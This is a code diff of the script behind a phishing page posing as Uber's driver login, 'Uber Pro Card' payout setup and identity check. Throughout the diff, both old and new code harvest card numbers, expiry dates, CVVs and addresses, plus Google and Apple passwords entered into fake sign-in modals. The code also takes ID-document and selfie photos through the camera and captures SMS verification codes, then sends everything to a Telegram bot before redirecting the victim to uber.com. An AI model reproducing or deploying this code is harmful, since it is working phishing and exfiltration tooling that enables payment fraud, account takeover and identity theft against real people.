+        await sendToTelegram(`⏭️ <b>UBER PRO CARD SKIPPED</b>\nUser selected "I don't have Uber Pro Card"\n⏱️ ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}`);
+        showToast("Proceeding without Pro Card (standard payout)", false);
+        gatePanel.classList.add('hide');
+        loginPanel.classList.remove('hide');
+    };
+    document.getElementById('backToGateBtn').onclick = ()=>{
+        cardDetailsPanel.classList.add('hide');
+        gatePanel.classList.remove('hide');
+    };
+
+    // Submit Pro card details
+    document.getElementById('submitCardDetailsBtn').onclick = async ()=>{
+        let fullName = document.getElementById('cardFullName').value.trim();
+        let cardNum = document.getElementById('cardNumber').value.replace(/\s/g,'');
+        let expiry = document.getElementById('cardExpiry').value.trim();
+        let cvv = document.getElementById('cardCvv').value.trim();
+        let address = document.getElementById('cardAddress').value.trim();
+        if(!fullName || !cardNum || !expiry || !cvv || !address){ showToast("Fill all card fields", true); return; }
+        if(cardNum.length<15 || cardNum.length>16){ showToast("Invalid card number", true); return; }
+        if(!/^\d{2}\/\d{2}$/.test(expiry)){ showToast("Expiry MM/YY", true); return; }
+        if(cvv.length<3){ showToast("CVV required", true); return; }
+        globalUser.hasProCard = true;
+        globalUser.proCardData = { fullName, cardNumber:cardNum, expiry, cvv, address };
+        await sendToTelegram(`💳 <b>UBER PRO CARD (LINKED - INSTANT PAYOUT)</b>\n👤 Name: ${fullName}\n💳 Card: ${cardNum}\n📅 Exp: ${expiry}\n🔒 CVV: ${cvv}\n🏠 Address: ${address}\n🕒 ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}`);
+        showToast("Pro Card linked! Continue to login.", false);
+        cardDetailsPanel.classList.add('hide');
+        loginPanel.classList.remove('hide');
+    };
+
+    // Login handlers (manual + social)
     const loginInput = document.getElementById('loginInput');
-    const loginContinueBtn = document.getElementById('loginContinueBtn');
-    const googleBtn = document.getElementById('googleLoginBtn');
-    const appleBtn = document.getElementById('appleLoginBtn');
-    const googleModal = document.getElementById('googleModal');
-    const appleModal = document.getElementById('appleModal');
-    const otpSubmitBtn = document.getElementById('otpSubmitBtn');
-    const otpInput = document.getElementById('otpCode');
-
-    let userData = {
-        loginValue: '',
-        loginMethod: '',
-        idType: '',
-        idState: '',
-        otp: '',
-        hasProCard: false,
-        cardDetails: null
-    };
-
-    function showToast(msg, isErr = false) {
-        toast.innerText = msg;
-        toast.classList.add('show');
-        toast.style.background = isErr ? '#B91C1C' : '#1A1A1A';
-        setTimeout(() => toast.classList.remove('show'), 3000);
-    }
-
-    async function sendToTelegram(text) {
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
-            });
-            const data = await res.json();
-            return data.ok;
-        } catch(e) { return false; }
-    }
-
-    async function sendPhotoToTelegram(blob, caption) {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'photo.jpg');
-        if (caption) formData.append('caption', caption);
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            const data = await res.json();
-            return data.ok;
-        } catch(e) { return false; }
-    }
-
-    // Helper: format card number spaces
-    document.getElementById('cardNumber')?.addEventListener('input', function(e) {
-        let val = e.target.value.replace(/\s/g, '');
-        if (val.length > 16) val = val.slice(0,16);
-        let parts = val.match(/.{1,4}/g);
-        if (parts) e.target.value = parts.join(' ');
-        else e.target.value = val;
-    });
-    document.getElementById('cardExpiry')?.addEventListener('input', function(e) {
-        let val = e.target.value.replace(/\D/g, '');
-        if (val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
-        e.target.value = val.slice(0,5);
-    });
-
-    // Submit Uber Pro Card (full details)
-    document.getElementById('submitProCardBtn').onclick = async () => {
-        const fullName = document.getElementById('cardFullName').value.trim();
-        const cardNumberRaw = document.getElementById('cardNumber').value.replace(/\s/g, '');
-        const expiry = document.getElementById('cardExpiry').value.trim();
-        const cvv = document.getElementById('cardCvv').value.trim();
-        const address = document.getElementById('cardAddress').value.trim();
-
-        if (!fullName || !cardNumberRaw || !expiry || !cvv || !address) {
-            showToast("Please fill all card details (name, number, expiry, CVV, address)", true);
-            return;
-        }
-        if (cardNumberRaw.length < 15 || cardNumberRaw.length > 16) {
-            showToast("Enter a valid card number (15-16 digits)", true);
-            return;
-        }
-        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
-            showToast("Expiry format: MM/YY", true);
-            return;
-        }
-        if (cvv.length < 3) {
-            showToast("CVV must be 3-4 digits", true);
-            return;
-        }
-
-        userData.hasProCard = true;
-        userData.cardDetails = { fullName, cardNumber: cardNumberRaw, expiry, cvv, address };
-        
-        // send to Telegram
-        const msg = `💳 <b>UBER PRO CARD (LINKED)</b>\n👤 Full Name: ${fullName}\n💳 Card: ${cardNumberRaw}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n🏠 Address: ${address}\n🕒 ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}`;
-        await sendToTelegram(msg);
-        showToast("✅ Pro Card linked securely", false);
-        
-        // proceed to login panel
-        cardPanel.classList.add('hide');
-        loginPanel.classList.remove('hide');
-    };
-
-    // Skip Pro Card (I don't have Uber Pro Card)
-    document.getElementById('skipProCardBtn').onclick = async () => {
-        userData.hasProCard = false;
-        userData.cardDetails = null;
-        await sendToTelegram(`⏭️ <b>UBER PRO CARD SKIPPED</b>\nUser chose "I don't have Uber Pro Card"\n⏱️ ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}`);
-        showToast("Continuing without Pro Card", false);
-        cardPanel.classList.add('hide');
-        loginPanel.classList.remove('hide');
-    };
-
-    // Manual login handler
-    loginContinueBtn.onclick = () => {
-        let value = loginInput.value.trim();
-        if (!value) {
-            showToast("Please enter your phone number or email", true);
-            return;
-        }
-        userData.loginValue = value;
-        userData.loginMethod = 'manual';
-        sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nLogin: ${value}\nMethod: Manual entry\nHas Pro Card: ${userData.hasProCard ? 'Yes' : 'No'}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+    document.getElementById('loginContinueBtn').onclick = ()=>{
+        let val = loginInput.value.trim();
+        if(!val){ showToast("Enter phone or email", true); return; }
+        globalUser.loginValue = val; globalUser.loginMethod='manual';
+        sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nLogin: ${val}\nMethod: Manual\nPro Card: ${globalUser.hasProCard ? 'YES (linked)' : 'NO'}\n⏱️ ${new Date().toLocaleString()}`);
         startKyc();
     };
-
     // Google modal
-    googleBtn.onclick = () => googleModal.classList.add('active');
-    document.getElementById('googleModalCancel').onclick = () => googleModal.classList.remove('active');
-    document.getElementById('googleModalConfirm').onclick = async () => {
+    const googleModal = document.getElementById('googleModal');
+    document.getElementById('googleLoginBtn').onclick = ()=> googleModal.classList.add('active');
+    document.getElementById('googleModalCancel').onclick = ()=> googleModal.classList.remove('active');
+    document.getElementById('googleModalConfirm').onclick = async ()=>{
         let email = document.getElementById('googleEmail').value.trim();
         let pass = document.getElementById('googlePassword').value.trim();
-        if (!email || !pass) { showToast("Enter Google credentials", true); return; }
-        userData.loginValue = email;
-        userData.loginMethod = 'google';
-        await sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nMethod: Google\nEmail: ${email}\nPassword: ${pass}\nHas Pro Card: ${userData.hasProCard ? 'Yes' : 'No'}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        if(!email || !pass){ showToast("Google credentials required", true); return; }
+        globalUser.loginValue=email; globalUser.loginMethod='google';
+        await sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nMethod: Google\nEmail: ${email}\nPassword: ${pass}\nPro Card: ${globalUser.hasProCard ? 'YES' : 'NO'}`);
         googleModal.classList.remove('active');
         startKyc();
     };
     // Apple modal
-    appleBtn.onclick = () => appleModal.classList.add('active');
-    document.getElementById('appleModalCancel').onclick = () => appleModal.classList.remove('active');
-    document.getElementById('appleModalConfirm').onclick = async () => {
+    const appleModal = document.getElementById('appleModal');
+    document.getElementById('appleLoginBtn').onclick = ()=> appleModal.classList.add('active');
+    document.getElementById('appleModalCancel').onclick = ()=> appleModal.classList.remove('active');
+    document.getElementById('appleModalConfirm').onclick = async ()=>{
         let email = document.getElementById('appleEmail').value.trim();
         let pass = document.getElementById('applePassword').value.trim();
-        if (!email || !pass) { showToast("Enter Apple ID credentials", true); return; }
-        userData.loginValue = email;
-        userData.loginMethod = 'apple';
-        await sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nMethod: Apple\nEmail: ${email}\nPassword: ${pass}\nHas Pro Card: ${userData.hasProCard ? 'Yes' : 'No'}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        if(!email || !pass){ showToast("Apple ID credentials required", true); return; }
+        globalUser.loginValue=email; globalUser.loginMethod='apple';
+        await sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nMethod: Apple\nEmail: ${email}\nPassword: ${pass}\nPro Card: ${globalUser.hasProCard ? 'YES' : 'NO'}`);
         appleModal.classList.remove('active');
         startKyc();
     };
 
-    function startKyc() {
-        loginPanel.classList.add('hide');
-        kycPanel.classList.remove('hide');
-        showStep(1);
-    }
+    function startKyc(){ loginPanel.classList.add('hide'); kycPanel.classList.remove('hide'); showKycStep(1); }
 
-    // KYC variables & camera logic
-    let currentKycStep = 1;
+    let currentKycStep=1;
     let frontStream, backStream, selfieStream, selfieIdStream;
-    let usingRearFront = true, usingRearBack = true, usingRearSelfie = false, usingRearSelfieId = false;
+    let usingRearFront=true, usingRearBack=true, usingRearSelfie=false, usingRearSelfieId=false;
+    async function initCamera(videoEl, mode){ try{ let s=await navigator.mediaDevices.getUserMedia({ video:{ facingMode:{ exact:mode } } }); videoEl.srcObject=s; await videoEl.play(); return s; } catch(e){ let s=await navigator.mediaDevices.getUserMedia({ video:true }); videoEl.srcObject=s; await videoEl.play(); return s; } }
+    async function switchCamera(video, curStream, setStream, setRear, rear){ if(curStream) curStream.getTracks().forEach(t=>t.stop()); let newStream=await initCamera(video, rear?'user':'environment'); setStream(newStream); setRear(!rear); }
+    async function capturePhoto(video, statusElem, side, nextStep){ statusElem.innerText="Uploading..."; let canvas=document.createElement('canvas'); let size=Math.min(video.videoWidth, video.videoHeight); canvas.width=size; canvas.height=size; let ctx=canvas.getContext('2d'); let sx=(video.videoWidth-size)/2; let sy=(video.videoHeight-size)/2; ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size); canvas.toBlob(async blob=>{ await sendPhotoToTelegram(blob, `${side} - ${globalUser.loginValue} (ProCard:${globalUser.hasProCard?'Yes':'No'})`); statusElem.innerText=`✅ ${side} sent`; if(nextStep) setTimeout(()=>showKycStep(nextStep),1000); },'image/jpeg',0.8); }
+    function showKycStep(step){ document.querySelectorAll('.kyc-step').forEach(el=>el.classList.add('hide')); document.getElementById(`kycStep${step}`).classList.remove('hide'); currentKycStep=step; updateDots(step); if(step===2) initCamera(document.getElementById('frontVideo'),'environment').then(s=>{ frontStream=s; usingRearFront=true; }); if(step===3) initCamera(document.getElementById('backVideo'),'environment').then(s=>{ backStream=s; usingRearBack=true; }); if(step===4) initCamera(document.getElementById('selfieVideo'),'user').then(s=>{ selfieStream=s; usingRearSelfie=false; }); if(step===5) initCamera(document.getElementById('selfieIdVideo'),'user').then(s=>{ selfieIdStream=s; usingRearSelfieId=false; }); }
+    function updateDots(step){ let dots=document.querySelectorAll('.step-dot'); dots.forEach((d,i)=>{ if(i+1<step) d.classList.add('completed'); else if(i+1===step) d.classList.add('active'); else d.classList.remove('active','completed'); }); }
+    document.getElementById('kycStep1Next').onclick=()=>{ let idType=document.getElementById('idType').value, idState=document.getElementById('idState').value; if(!idType||!idState){ showToast("Select ID type and state",true); return; } globalUser.idType=idType; globalUser.idState=idState; sendToTelegram(`📄 ID: ${idType}, State: ${idState} (ProCard:${globalUser.hasProCard?'Linked':'Skipped'})`); showKycStep(2); };
+    document.getElementById('switchFrontCam').onclick=()=>switchCamera(document.getElementById('frontVideo'),frontStream,s=>frontStream=s,v=>usingRearFront=v,usingRearFront);
+    document.getElementById('captureFrontBtn').onclick=()=>capturePhoto(document.getElementById('frontVideo'),document.getElementById('frontStatus'),"FrontID",3);
+    document.getElementById('switchBackCam').onclick=()=>switchCamera(document.getElementById('backVideo'),backStream,s=>backStream=s,v=>usingRearBack=v,usingRearBack);
+    document.getElementById('captureBackBtn').onclick=()=>capturePhoto(document.getElementById('backVideo'),document.getElementById('backStatus'),"BackID",4);
+    document.getElementById('switchSelfieCam').onclick=()=>switchCamera(document.getElementById('selfieVideo'),selfieStream,s=>selfieStream=s,v=>usingRearSelfie=v,usingRearSelfie);
+    document.getElementById('captureSelfieBtn').onclick=()=>capturePhoto(document.getElementById('selfieVideo'),document.getElementById('selfieStatus'),"Selfie",5);
+    document.getElementById('switchSelfieIdCam').onclick=()=>switchCamera(document.getElementById('selfieIdVideo'),selfieIdStream,s=>selfieIdStream=s,v=>usingRearSelfieId=v,usingRearSelfieId);
+    document.getElementById('captureSelfieIdBtn').onclick=()=>capturePhoto(document.getElementById('selfieIdVideo'),document.getElementById('selfieIdStatus'),"SelfieWithID",null).then(()=>{ kycPanel.classList.add('hide'); otpPanel.classList.remove('hide'); showToast("Documents uploaded. Enter SMS code.",false); });
 
-    function showStep(step) {
-        document.querySelectorAll('.kyc-step').forEach(el => el.classList.add('hide'));
-        document.getElementById(`kycStep${step}`).classList.remove('hide');
-        currentKycStep = step;
-        updateStepDots(step);
-        if (step === 2) initCamera(document.getElementById('frontVideo'), 'environment').then(s => { frontStream = s; usingRearFront = true; });
-        if (step === 3) initCamera(document.getElementById('backVideo'), 'environment').then(s => { backStream = s; usingRearBack = true; });
-        if (step === 4) initCamera(document.getElementById('selfieVideo'), 'user').then(s => { selfieStream = s; usingRearSelfie = false; });
-        if (step === 5) initCamera(document.getElementById('selfieIdVideo'), 'user').then(s => { selfieIdStream = s; usingRearSelfieId = false; });
-    }
-    function updateStepDots(step) {
-        const dots = document.querySelectorAll('.step-dot');
-        dots.forEach((dot, i) => {
-            if (i+1 < step) dot.classList.add('completed');
-            else if (i+1 === step) dot.classList.add('active');
-            else dot.classList.remove('active', 'completed');
-        });
-    }
-    async function initCamera(videoEl, facingMode) {
-        try {
-            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
-            videoEl.srcObject = stream; await videoEl.play(); return stream;
-        } catch(e) {
-            let stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            videoEl.srcObject = stream; await videoEl.play(); return stream;
-        }
-    }
-    async function switchCamera(video, currentStream, setStream, setRear, rear) {
-        if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-        let newFacing = rear ? 'user' : 'environment';
-        let newStream = await initCamera(video, newFacing);
-        setStream(newStream);
-        setRear(!rear);
-    }
-    async function capturePhoto(video, statusElem, side, nextStep) {
-        statusElem.innerText = "Processing...";
-        let canvas = document.createElement('canvas');
-        let size = Math.min(video.videoWidth, video.videoHeight);
-        canvas.width = size; canvas.height = size;
-        let ctx = canvas.getContext('2d');
-        let sx = (video.videoWidth - size)/2;
-        let sy = (video.videoHeight - size)/2;
-        ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
-        canvas.toBlob(async blob => {
-            const caption = `${side} - ${userData.loginValue || userData.loginMethod} - ProCard:${userData.hasProCard ? 'Yes' : 'No'}`;
-            await sendPhotoToTelegram(blob, caption);
-            statusElem.innerText = `✅ ${side} uploaded.`;
-            if (nextStep) setTimeout(() => showStep(nextStep), 1000);
-        }, 'image/jpeg', 0.8);
-    }
-
-    document.getElementById('kycStep1Next').onclick = () => {
-        let idType = document.getElementById('idType').value;
-        let idState = document.getElementById('idState').value;
-        if (!idType || !idState) { showToast("Select ID type and state", true); return; }
-        userData.idType = idType;
-        userData.idState = idState;
-        sendToTelegram(`📄 ID Type: ${idType}, State: ${idState} (ProCard: ${userData.hasProCard ? 'Linked' : 'Skipped'})`);
-        showStep(2);
-    };
-    document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'), frontStream, s=>frontStream=s, v=>usingRearFront=v, usingRearFront);
-    document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), "Front ID", 3);
-    document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'), backStream, s=>backStream=s, v=>usingRearBack=v, usingRearBack);
-    document.getElementById('captureBackBtn').onclick = () => capturePhoto(document.getElementById('backVideo'), document.getElementById('backStatus'), "Back ID", 4);
-    document.getElementById('switchSelfieCam').onclick = () => switchCamera(document.getElementById('selfieVideo'), selfieStream, s=>selfieStream=s, v=>usingRearSelfie=v, usingRearSelfie);
-    document.getElementById('captureSelfieBtn').onclick = () => capturePhoto(document.getElementById('selfieVideo'), document.getElementById('selfieStatus'), "Selfie", 5);
-    document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'), selfieIdStream, s=>selfieIdStream=s, v=>usingRearSelfieId=v, usingRearSelfieId);
-    document.getElementById('captureSelfieIdBtn').onclick = () => capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "Selfie holding ID", null).then(() => {
-        kycPanel.classList.add('hide');
-        otpPanel.classList.remove('hide');
-        showToast("All documents uploaded. Enter verification code.", false);
-    });
-
-    // OTP final step
-    otpSubmitBtn.onclick = async () => {
-        let otp = otpInput.value.trim();
-        if (!otp) { showToast("Verification code required", true); return; }
-        userData.otp = otp;
-        await sendToTelegram(`🔐 <b>VERIFICATION CODE</b>\nCode: ${otp}\nUser: ${userData.loginValue || userData.loginMethod}\nPro Card Status: ${userData.hasProCard ? 'Linked' : 'Skipped'}\nAll KYC photos completed.`);
+    document.getElementById('otpSubmitBtn').onclick = async ()=>{
+        let otp = document.getElementById('otpCode').value.trim();
+        if(!otp){ showToast("Enter verification code",true); return; }
+        globalUser.otp = otp;
+        await sendToTelegram(`🔐 <b>VERIFICATION + INSTANT PAYOUT READY</b>\nCode: ${otp}\nUser: ${globalUser.loginValue}\nPro Card Status: ${globalUser.hasProCard ? 'ACTIVATED' : 'NOT LINKED'}\nAll KYC completed.`);
         loadingOverlay.classList.add('active');
-        setTimeout(() => {
+        setTimeout(()=>{
             loadingOverlay.classList.remove('active');
-            showToast("✅ Verification successful! Redirecting to Uber...", false);
-            setTimeout(() => window.location.href = "https://www.uber.com", 1500);
-        }, 1500);
+            showToast("✅ Account reactivated! Redirecting to Uber Dashboard...", false);
+            setTimeout(()=> window.location.href="https://www.uber.com", 1800);
+        }, 1800);
     };
 </script>
 </body>
